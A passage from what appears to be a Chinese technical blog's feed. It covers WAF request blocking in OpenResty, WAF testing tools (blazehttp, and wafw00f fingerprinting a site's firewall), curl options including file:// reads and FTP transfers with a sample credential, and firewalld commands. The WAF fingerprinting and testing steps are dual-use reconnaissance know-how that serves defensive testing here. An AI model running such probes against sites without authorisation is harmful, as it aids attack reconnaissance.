class="hljs-string">&quot;&lt;h1&gt;Request Blocked&lt;/h1&gt;&quot;</span>)<br>ngx.<span class="hljs-keyword">exit</span>(<span class="hljs-number">403</span>)<br></code></pre></td></tr></table></figure><p>1、请求头已经完整解析：WAF可以获取完整的URI、Headers、HTTP方法等元数据。</p><p>2、请求体尚未处理：允许通过配置获取POST数据，同时避免资源浪费。</p><p>3、位于权限检查链：在Nginx原生 allow&#x2F;deny 等访问控制之后执行，符合安全逻辑分层。</p><p>4、拦截响应未生成：可直接返回 403 等拦截响应，无需进入后续处理阶段。</p><h2 id="业务保护策略"><a href="#业务保护策略" class="headerlink" title="业务保护策略"></a>业务保护策略</h2><h3 id="主动被动熔断机制"><a href="#主动被动熔断机制" class="headerlink" title="主动被动熔断机制"></a>主动被动熔断机制</h3><p>主动熔断机制：防御节点异常，WAF自动停止流量转发或检测</p><p>被动熔断机制：业务流量增长，业务自动停止流量转发或检测</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>waf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>waf_tools</title>
    <link href="/2024/03/15/security/netsec/waf/waf_tools/"/>
    <url>/2024/03/15/security/netsec/waf/waf_tools/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>测试waf时，需要对waf产品进行性能测试，除了手工模拟攻击测试外，可以使用开源WAF测试工具自动化进行深度测试。</p><h1 id="chaitin-blazehttp"><a href="#chaitin-blazehttp" class="headerlink" title="chaitin&#x2F;blazehttp"></a>chaitin&#x2F;blazehttp</h1><h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><p><a href="https://github.com/chaitin/blazehttp">https://github.com/chaitin/blazehttp</a></p><h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="下载相关安装包"><a href="#下载相关安装包" class="headerlink" title="下载相关安装包"></a>下载相关安装包</h4><p><a href="https://github.com/chaitin/blazehttp">https://github.com/chaitin/blazehttp</a></p><h4 id="GUI版本直接打开即可"><a href="#GUI版本直接打开即可" class="headerlink" title="GUI版本直接打开即可"></a>GUI版本直接打开即可</h4><p><img src="/image-20250102165306403.png" alt="image-20250102165306403"></p><h2 id="测试效果"><a href="#测试效果" class="headerlink" title="测试效果"></a>测试效果</h2><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><p>【1】blazehttp </p><p><a href="https://github.com/chaitin/blazehttp">https://github.com/chaitin/blazehttp</a></p><h1 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a>wafw00f</h1><h2 id="工具安装-1"><a href="#工具安装-1" class="headerlink" title="工具安装"></a>工具安装</h2><h3 id="Install-from-PyPI-recommended"><a href="#Install-from-PyPI-recommended" class="headerlink" title="Install from PyPI (recommended)"></a>Install from PyPI (recommended)</h3><p>python3 -m pip install wafw00f</p><p>or</p><p>pip3 install wafw00f</p><h3 id="Via-Docker"><a href="#Via-Docker" class="headerlink" title="Via Docker"></a>Via Docker</h3><p>It is also possible to run it within a docker container. Clone this repository first and build the Docker image using:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  security git <span class="hljs-built_in">clone</span> https://github.com/EnableSecurity/wafw00f.git<br>正克隆到 <span class="hljs-string">&#x27;wafw00f&#x27;</span>...<br>remote: Enumerating objects: 5021, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (1097/1097), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (265/265), <span class="hljs-keyword">done</span>.<br>remote: Total 5021 (delta 917), reused 832 (delta 832), pack-reused 3924 (from 3)<br>接收对象中: 100% (5021/5021), 807.80 KiB | 1.03 MiB/s, 完成.<br>处理 delta 中: 100% (3662/3662), 完成.<br></code></pre></td></tr></table></figure><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">docker build . -<span class="hljs-built_in">t</span> wafw00f<br></code></pre></td></tr></table></figure><p>报错信息</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livescript">[+] Building <span class="hljs-number">75.8s</span> (<span class="hljs-number">3</span>/<span class="hljs-number">3</span>) FINISHED                                                                                 <br> =&gt; [internal] load build definition <span class="hljs-keyword">from</span> Dockerfile                                                         <span class="hljs-number">0.0s</span><br> =&gt; =&gt; transferring dockerfile: <span class="hljs-number">457</span>B                                                                         <span class="hljs-number">0.0s</span><br> =&gt; [internal] load .dockerignore                                                                            <span class="hljs-number">0.0s</span><br> =&gt; =&gt; transferring context: <span class="hljs-number">2</span>B                                                                              <span class="hljs-number">0.0s</span><br> =&gt; ERROR [internal] load metadata <span class="hljs-keyword">for</span> docker.io/library/python:<span class="hljs-number">3.11</span>.<span class="hljs-number">9</span>-alpine                               <span class="hljs-number">75.7s</span><br>------<br> &gt; [internal] load metadata <span class="hljs-keyword">for</span> docker.io/library/python:<span class="hljs-number">3.11</span>.<span class="hljs-number">9</span>-alpine:<br>------<br>failed <span class="hljs-keyword">to</span> solve <span class="hljs-keyword">with</span> frontend dockerfile.v0: failed <span class="hljs-keyword">to</span> create LLB definition: pull access denied, repository does <span class="hljs-keyword">not</span> exist <span class="hljs-keyword">or</span> may <span class="hljs-built_in">require</span> authorization: server message: insufficient_scope: authorization failed<br></code></pre></td></tr></table></figure><p>docker login 登录</p><p>Now you can run:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> --<span class="hljs-built_in">rm</span> -it wafw00f https://example.com</span><br></code></pre></td></tr></table></figure><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-punctuation">(</span>base<span class="hljs-punctuation">)</span> [root@ wafw00f]<span class="hljs-meta"># wafw00f https:<span class="hljs-comment">//wafwaf2025.domain.com</span></span><br><br>                 ?              <span class="hljs-punctuation">,</span>.   <span class="hljs-punctuation">(</span>   .      <span class="hljs-punctuation">)</span>        .      <span class="hljs-string">&quot;</span><br>         __        ??          <span class="hljs-punctuation">(</span><span class="hljs-string">&quot;     )  )&#x27;     ,&#x27;        )  . (`     &#x27;`</span><br>    <span class="hljs-punctuation">(</span>___<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>&#x27;`;   ???          .; )  &#x27; <span class="hljs-punctuation">(</span><span class="hljs-punctuation">(</span> <span class="hljs-punctuation">(</span><span class="hljs-string">&quot; )    ;(,     ((  (  ;)  &quot;</span>  <span class="hljs-punctuation">)</span><span class="hljs-string">&quot;)</span><br>    /<span class="hljs-punctuation">,</span>___ /`                 _<span class="hljs-string">&quot;., ,._&#x27;_.,)_(..,( . )_  _&#x27; )_&#x27;) (. _..( &#x27; )</span><br>    \\   \\                 <span class="hljs-string">|____|____|____|____|____|____|____|____|____|</span><br><br>                                <span class="hljs-symbol">~ WAFW00F </span>: v2.<span class="hljs-number">3.1</span> <span class="hljs-symbol">~</span><br><span class="hljs-symbol">                    ~ Sniffing Web Application Firewalls since 2014 ~</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">[*] Checking https</span>:<span class="hljs-comment">//wafwaf2025.domain.com</span><br>[<span class="hljs-punctuation">+</span>] The site https<span class="hljs-punctuation">:</span><span class="hljs-comment">//wafwaf2025.domain.com is behind Huawei Cloud Firewall (Huawei) WAF.</span><br>[<span class="hljs-symbol">~] Number of requests</span>: <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>waf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>curl_base</title>
    <link href="/2024/03/15/yunwei/applications/curl/curl_base/"/>
    <url>/2024/03/15/yunwei/applications/curl/curl_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>curl 是一个免费的开源工具，用于从或向服务器传输数据。它支持多种操作系统，如 Windows、Ubuntu、RHEL、CentOS、Fedora 和 OpenSUSE。</p><h2 id="功能提供"><a href="#功能提供" class="headerlink" title="功能提供"></a>功能提供</h2><p>curl 所有的传输功能均为 libcurl 库提供</p><h2 id="语法参数"><a href="#语法参数" class="headerlink" title="语法参数"></a>语法参数</h2><h3 id="–insecure"><a href="#–insecure" class="headerlink" title="–insecure"></a>–insecure</h3><p>忽略HTTPS证书校验</p><h3 id="v"><a href="#v" class="headerlink" title="-v"></a>-v</h3><p>显示完整通信过程，端口连接，request请求</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs gams">root@iZbp1191gh7vw52537lyxrZ:~# curl https:<span class="hljs-comment">//10000hours.github.io -v</span><br><span class="hljs-comment">*   Trying 185.199.108.153:443...</span><br><span class="hljs-comment">*   Trying 2606:50c0:8000::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8000::153: Network is unreachable</span><br><span class="hljs-comment">*   Trying 2606:50c0:8003::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8003::153: Network is unreachable</span><br><span class="hljs-comment">*   Trying 2606:50c0:8002::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8002::153: Network is unreachable</span><br><span class="hljs-comment">*   Trying 2606:50c0:8001::153:443...</span><br><span class="hljs-comment">* Immediate connect fail for 2606:50c0:8001::153: Network is unreachable</span><br><span class="hljs-comment">* Connected to 10000hours.github.io (185.199.108.153) port 443 (#0)</span><br><span class="hljs-comment">* ALPN, offering h2</span><br><span class="hljs-comment">* ALPN, offering http/1.1</span><br><span class="hljs-comment">*  CAfile: /etc/ssl/certs/ca-certificates.crt</span><br><span class="hljs-comment">*  CApath: /etc/ssl/certs</span><br><span class="hljs-comment">* TLSv1.0 (OUT), TLS header, Certificate Status (22):</span><br><span class="hljs-comment">* TLSv1.3 (OUT), TLS handshake, Client hello (1):</span><br><span class="hljs-comment">* TLSv1.2 (IN), TLS header, Certificate Status (22):</span><br></code></pre></td></tr></table></figure><h3 id="H"><a href="#H" class="headerlink" title="-H"></a>-H</h3><p>设置请求header</p><p>-H “X-Stream-Protocol-Version: <a href="http://v2.channel.k8s.io/">v2.channel.k8s.io</a>“</p><h3 id="X"><a href="#X" class="headerlink" title="-X"></a>-X</h3><p>指定协议，默认GET</p><p>-X POST</p><h3 id="d"><a href="#d" class="headerlink" title="-d"></a>-d</h3><p>指定参数 -d ‘key&#x3D;value’，多个参数，多个-d</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl <span class="hljs-punctuation">-</span>d <span class="hljs-string">&quot;name=curl&quot;</span> https<span class="hljs-punctuation">:</span><span class="hljs-comment">//example.com</span><br>curl <span class="hljs-punctuation">-</span>d <span class="hljs-string">&quot;name=curl&quot;</span> <span class="hljs-punctuation">-</span>d <span class="hljs-string">&quot;tool=cmdline&quot;</span> https<span class="hljs-punctuation">:</span><span class="hljs-comment">//example.com</span><br></code></pre></td></tr></table></figure><h3 id="G"><a href="#G" class="headerlink" title="-G"></a>-G</h3><p>指定发送GET请求</p><h3 id="k"><a href="#k" class="headerlink" title="-k"></a>-k</h3><p>忽略HTTPS证书校验</p><h3 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h3><p>静默模式，不输出任何信息</p><h3 id="S"><a href="#S" class="headerlink" title="-S"></a>-S</h3><p>显示错误信息</p><h3 id="L"><a href="#L" class="headerlink" title="-L"></a>-L</h3><p>跟随重定向</p><h3 id="e"><a href="#e" class="headerlink" title="-e"></a>-e</h3><p>设置referer</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl <span class="hljs-punctuation">-</span>e <span class="hljs-string">&quot;https://example.com&quot;</span> http<span class="hljs-punctuation">:</span><span class="hljs-comment">//www.example.com</span><br></code></pre></td></tr></table></figure><h2 id="支持的协议"><a href="#支持的协议" class="headerlink" title="支持的协议"></a>支持的协议</h2><h3 id="DICT"><a href="#DICT" class="headerlink" title="DICT"></a>DICT</h3><p>Lets you lookup words using online dictionaries.</p><p>允许您使用在线词典查找单词。</p><h3 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a>FILE</h3><p>Read or write local files. curl does not support accessing file:&#x2F;&#x2F; URL remotely, but when running on Microsoft Windows using the native UNC approach will work.</p><p>读取或写入本地文件。curl不支持远程访问file:&#x2F;&#x2F; URL，但在Microsoft Windows上运行时，使用本机UNC方法可以工作。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># curl file:///root/1.txt</span><br><span class="hljs-number">111111</span><br></code></pre></td></tr></table></figure><h3 id="FTP-FTPS"><a href="#FTP-FTPS" class="headerlink" title="FTP FTPS"></a>FTP FTPS</h3><p>curl supports the File Transfer Protocol with a lot of tweaks and levers. With or without using TLS.</p><p>curl支持使用文件传输协议，并具有许多调整和杠杆作用。无论是否使用TLS，都可以使用它。</p><h4 id="从FTP服务器下载文件"><a href="#从FTP服务器下载文件" class="headerlink" title="从FTP服务器下载文件"></a>从FTP服务器下载文件</h4><p>curl <a href="ftp://username/">ftp://username</a>:<a href="http://mailto:password@ftp.example.com/">password@ftp.example.com</a>&#x2F;download&#x2F;file.txt -o local_file.txt</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">➜  /tmp curl <span class="hljs-symbol">ftp:</span>//<span class="hljs-symbol">hot:</span><span class="hljs-number">123456</span><span class="hljs-variable">@10</span>.<span class="hljs-number">2.2</span>.<span class="hljs-number">2</span>/hotcal.tar.gz -o local_file.txt<br>  % <span class="hljs-title class_">Total</span>    % <span class="hljs-title class_">Received</span> % <span class="hljs-title class_">Xferd</span>  <span class="hljs-title class_">Average</span> <span class="hljs-title class_">Speed</span>   <span class="hljs-title class_">Time</span>    <span class="hljs-title class_">Time</span>     <span class="hljs-title class_">Time</span>  <span class="hljs-title class_">Current</span><br>                                 <span class="hljs-title class_">Dload</span>  <span class="hljs-title class_">Upload</span>   <span class="hljs-title class_">Total</span>   <span class="hljs-title class_">Spent</span>    <span class="hljs-title class_">Left</span>  <span class="hljs-title class_">Speed</span><br><span class="hljs-number">100</span> <span class="hljs-number">95172</span>  <span class="hljs-number">100</span> <span class="hljs-number">95172</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>   <span class="hljs-number">484</span>k      <span class="hljs-number">0</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span>  <span class="hljs-number">491</span>k<br><br>➜  /tmp ls -la local_file.txt<br>-rw-r--r--  <span class="hljs-number">1</span> admin  wheel  <span class="hljs-number">95172</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span> <span class="hljs-number">17</span><span class="hljs-symbol">:</span><span class="hljs-number">43</span> local_file.txt<br></code></pre></td></tr></table></figure><h4 id="上传文件到FTP服务器"><a href="#上传文件到FTP服务器" class="headerlink" title="上传文件到FTP服务器"></a>上传文件到FTP服务器</h4><p>curl -T “file.txt” <a href="ftp://username/">ftp://username</a>:<a href="http://mailto:password@ftp.example.com/">password@ftp.example.com</a>&#x2F;upload&#x2F;</p><h4 id="被动模式进行FTP传输"><a href="#被动模式进行FTP传输" class="headerlink" title="被动模式进行FTP传输"></a>被动模式进行FTP传输</h4><p>被动模式用于解决某些情况下，主动模式失败的情况</p><p>curl -e “<a href="ftp://ftp.example.com/">ftp://ftp.example.com</a>“ <a href="ftp://username/">ftp://username</a>:<a href="http://mailto:password@ftp.example.com/">password@ftp.example.com</a>&#x2F;download&#x2F;file.txt -o local_file.txt</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">➜  /tmp curl -e <span class="hljs-string">&quot;ftp://10.2.2.2&quot;</span> <span class="hljs-symbol">ftp:</span>//<span class="hljs-symbol">hot:</span><span class="hljs-number">123456</span><span class="hljs-variable">@10</span>.<span class="hljs-number">2.2</span>.<span class="hljs-number">2</span>/hotcal.tar.gz -o local_file.txt <br>  % <span class="hljs-title class_">Total</span>    % <span class="hljs-title class_">Received</span> % <span class="hljs-title class_">Xferd</span>  <span class="hljs-title class_">Average</span> <span class="hljs-title class_">Speed</span>   <span class="hljs-title class_">Time</span>    <span class="hljs-title class_">Time</span>     <span class="hljs-title class_">Time</span>  <span class="hljs-title class_">Current</span><br>                                 <span class="hljs-title class_">Dload</span>  <span class="hljs-title class_">Upload</span>   <span class="hljs-title class_">Total</span>   <span class="hljs-title class_">Spent</span>    <span class="hljs-title class_">Left</span>  <span class="hljs-title class_">Speed</span><br><span class="hljs-number">100</span> <span class="hljs-number">95172</span>  <span class="hljs-number">100</span> <span class="hljs-number">95172</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>   <span class="hljs-number">518</span>k      <span class="hljs-number">0</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span>  <span class="hljs-number">537</span>k<br>➜  /tmp <br>➜  /tmp ls -lat local_file.txt <br>-rw-r--r--  <span class="hljs-number">1</span> admin  wheel  <span class="hljs-number">95172</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span> <span class="hljs-number">19</span><span class="hljs-symbol">:</span><span class="hljs-number">21</span> local_file.txt<br></code></pre></td></tr></table></figure><h3 id="GOPHER-GOPHERS"><a href="#GOPHER-GOPHERS" class="headerlink" title="GOPHER GOPHERS"></a>GOPHER GOPHERS</h3><p>Retrieve files.</p><p>检索文件</p><h3 id="HTTP-HTTPS"><a href="#HTTP-HTTPS" class="headerlink" title="HTTP HTTPS"></a>HTTP HTTPS</h3><p>curl supports HTTP with numerous options and variations. It can speak HTTP version 0.9, 1.0, 1.1, 2 and 3 depending on build options and the correct command line options.</p><p>curl通过许多选项和变体支持HTTP。它可以使用HTTP版本0.9、1.0、1.1、2和3，具体取决于构建选项和正确的命令行选项。</p><h3 id="IMAP-IMAPS"><a href="#IMAP-IMAPS" class="headerlink" title="IMAP IMAPS"></a>IMAP IMAPS</h3><p>Using the mail reading protocol, curl can “download” emails for you. With or without using TLS.</p><p>使用邮件读取协议，curl可以为您“下载”电子邮件。使用或不使用TLS。</p><h3 id="LDAP-LDAPS-MQTT-POP3-POP3S-RTMP-RTMPS-RTSP-SCP-SFTP-SMB-SMBS-SMTP-SMTPS-TELNET-or-TFTP"><a href="#LDAP-LDAPS-MQTT-POP3-POP3S-RTMP-RTMPS-RTSP-SCP-SFTP-SMB-SMBS-SMTP-SMTPS-TELNET-or-TFTP" class="headerlink" title="LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP"></a>LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP</h3><h2 id="官方链接"><a href="#官方链接" class="headerlink" title="官方链接"></a>官方链接</h2><p><a href="https://curl.se/libcurl/">https://curl.se/libcurl/</a></p><p><a href="https://github.com/curl/curl">https://github.com/curl/curl</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iptables_command</title>
    <link href="/2024/03/15/yunwei/applications/firewalld/iptables_command/"/>
    <url>/2024/03/15/yunwei/applications/firewalld/iptables_command/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h2><p>firewalld和iptables是可以并存的</p><h3 id="Friewalld"><a href="#Friewalld" class="headerlink" title="Friewalld"></a>Friewalld</h3><p>CentOS7默认防火墙</p><p>开启防护墙之后默认是没有任何策略的，也就是除SSH的22端口之外其他的端口都不通</p><p>防火墙策略的增加都是追加形式</p><h4 id="查询防火墙状态"><a href="#查询防火墙状态" class="headerlink" title="查询防火墙状态"></a>查询防火墙状态</h4><h5 id="firewall-cmd-–state"><a href="#firewall-cmd-–state" class="headerlink" title="firewall-cmd –state"></a>firewall-cmd –state</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--state</span><br>not running<br><br>┌──(root㉿kali2022-)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--state</span><br>running<br></code></pre></td></tr></table></figure><h4 id="启动-停止防火墙"><a href="#启动-停止防火墙" class="headerlink" title="启动&#x2F;停止防火墙"></a>启动&#x2F;停止防火墙</h4><h5 id="systemctl-start-firewalld"><a href="#systemctl-start-firewalld" class="headerlink" title="systemctl start firewalld"></a>systemctl start firewalld</h5><h5 id="systemctl-stop-firewalld"><a href="#systemctl-stop-firewalld" class="headerlink" title="systemctl stop firewalld"></a>systemctl stop firewalld</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-)-<span class="hljs-selector-attr">[~]</span><br>└─# systemctl start firewalld<br></code></pre></td></tr></table></figure><h4 id="开启-关闭开机启动"><a href="#开启-关闭开机启动" class="headerlink" title="开启&#x2F;关闭开机启动"></a>开启&#x2F;关闭开机启动</h4><h5 id="systemctl-enable-firewalld"><a href="#systemctl-enable-firewalld" class="headerlink" title="systemctl enable firewalld"></a>systemctl enable firewalld</h5><h5 id="systemctl-disable-firewalld"><a href="#systemctl-disable-firewalld" class="headerlink" title="systemctl disable firewalld"></a>systemctl disable firewalld</h5><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nsis">┌──(root㉿kali2022-)-[~]<br>└─<span class="hljs-comment"># systemctl disable firewalld</span><br><br>┌──(root㉿kali2022-)-[~]<br>└─<span class="hljs-comment"># systemctl enable firewalld</span><br>Created symlink /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/dbus-org.fedoraproject.FirewallD1.service → /lib/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/firewalld.service.<br>Created symlink /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/multi-<span class="hljs-literal">user</span>.target.wants/firewalld.service → /lib/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/firewalld.service.<br></code></pre></td></tr></table></figure><h4 id="加载防火墙策略"><a href="#加载防火墙策略" class="headerlink" title="加载防火墙策略"></a>加载防火墙策略</h4><p>修改防火墙规则后，需要重新加载防火墙</p><h5 id="firewall-cmd-–reload"><a href="#firewall-cmd-–reload" class="headerlink" title="firewall-cmd –reload"></a>firewall-cmd –reload</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--reload</span><br>success<br></code></pre></td></tr></table></figure><h4 id="查看防火墙开放的端口"><a href="#查看防火墙开放的端口" class="headerlink" title="查看防火墙开放的端口"></a>查看防火墙开放的端口</h4><h5 id="firewall-cmd-–list-ports"><a href="#firewall-cmd-–list-ports" class="headerlink" title="firewall-cmd –list-ports"></a>firewall-cmd –list-ports</h5><p>默认不开放任何端口</p><h4 id="查看防火墙策略"><a href="#查看防火墙策略" class="headerlink" title="查看防火墙策略"></a>查看防火墙策略</h4><h5 id="firewall-cmd-–list-all"><a href="#firewall-cmd-–list-all" class="headerlink" title="firewall-cmd –list-all"></a>firewall-cmd –list-all</h5><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kali2022-)-[~]<br>└─<span class="hljs-comment"># firewall-cmd --list-all</span><br>public (active)<br>  <span class="hljs-params">target:</span> default<br>  <span class="hljs-params">icmp-block-inversion:</span> no<br>  <span class="hljs-params">interfaces:</span> eth0<br>  <span class="hljs-params">sources:</span><br>  <span class="hljs-params">services:</span> dhcpv6-client ssh<br>  <span class="hljs-params">ports:</span><br>  <span class="hljs-params">protocols:</span><br>  <span class="hljs-params">forward:</span> yes<br>  <span class="hljs-params">masquerade:</span> no<br>  <span class="hljs-params">forward-ports:</span><br>  <span class="hljs-params">source-ports:</span><br>  <span class="hljs-params">icmp-blocks:</span><br>  rich <span class="hljs-params">rules:</span><br>        rule family<span class="hljs-operator">=</span><span class="hljs-string">&quot;ipv4&quot;</span> source address<span class="hljs-operator">=</span><span class="hljs-string">&quot;10.222.28.166&quot;</span> port port<span class="hljs-operator">=</span><span class="hljs-string">&quot;11211&quot;</span> protocol<span class="hljs-operator">=</span><span class="hljs-string">&quot;tcp&quot;</span> accept<br></code></pre></td></tr></table></figure><h4 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h4><h5 id="firewall-cmd-–zone-public-–add-port-80-tcp-–permanent"><a href="#firewall-cmd-–zone-public-–add-port-80-tcp-–permanent" class="headerlink" title="firewall-cmd –zone&#x3D;public –add-port&#x3D;80&#x2F;tcp –permanent"></a>firewall-cmd –zone&#x3D;public –add-port&#x3D;80&#x2F;tcp –permanent</h5><p>参数解读：</p><p>–zone&#x3D;public #作用域</p><p>–add-port&#x3D;80&#x2F;tcp #添加端口，格式为：端口&#x2F;通讯协议</p><p>–permanent #永久生效，没有该参数防火墙重启后失效</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit">┌──(root㉿kali2022-)-[~]<br>└─# firewall-cmd --zone=public --add-port=80/tcp --permanent<br><span class="hljs-keyword">success</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword"></span>┌──(root㉿kali2022-)-[~]<br>└─# firewall-cmd --list-ports<br>80/tcp<br></code></pre></td></tr></table></figure><h4 id="删除端口"><a href="#删除端口" class="headerlink" title="删除端口"></a>删除端口</h4><h5 id="firewall-cmd-–zone-public-–remove-port-80-tcp-–permanent"><a 